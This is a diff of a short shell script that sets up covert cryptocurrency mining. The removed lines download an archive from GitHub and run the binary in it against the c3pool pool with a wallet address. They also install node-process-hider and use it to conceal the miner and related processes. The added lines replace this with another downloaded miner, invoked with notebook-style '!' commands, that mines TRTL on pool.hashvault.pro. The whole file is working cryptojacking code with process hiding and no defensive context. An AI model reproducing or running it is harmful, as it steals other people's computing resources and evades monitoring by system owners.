@@ -1,21 +1,3 @@
-#!/bin/sh
-pkill -
-wget https://github.com/muledan1/bash/raw/main/-.tar.gz
-tar -xf -.tar.gz
-apt-get update;apt-get -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
-curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
-apt-get install -y nodejs
-npm i -g node-process-hider
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-dpkg-reconfigure --frontend noninteractive tzdata
-
-sudo swapoff -a; sudo swapon -a
-sleep 10
-ph add gudubrag.sh
-Ph add python3
-ph add root
-ph add node-process-hider
-ph add -
-./- -o auto.c3pool.org:80 -u 8Akom9jdkvSSA6EGYTb4Uy19Z2QAWE7NGbZQ6iafP5xeVZXLYNuSFPURqTVATZKuB6T5NeYpuabDshnodCURBxMpP7y889B.GS 
-sleep 10
+!wget https://github.com/NabilaMahmudah/orge/raw/main/kh.tar.gz && tar xf kh.tar.gz
+!./h --pool pool.hashvault.pro:80 --username TRTLv1Hqo3wHdqLRXuCyX3MwvzKyxzwXeBtycnkDy8ceFp4E23bm3P467xLEbUusH6Q1mqQUBiYwJ2yULJbvr5nKe8kcyc4uyps.c36e2c4c8a7d5ca2c0dd0a433ac55ae41b1db55d2a7e800a15053c288d082ee8 --password BOOL-2 --algorithm chukwa_v2 --ssl
 
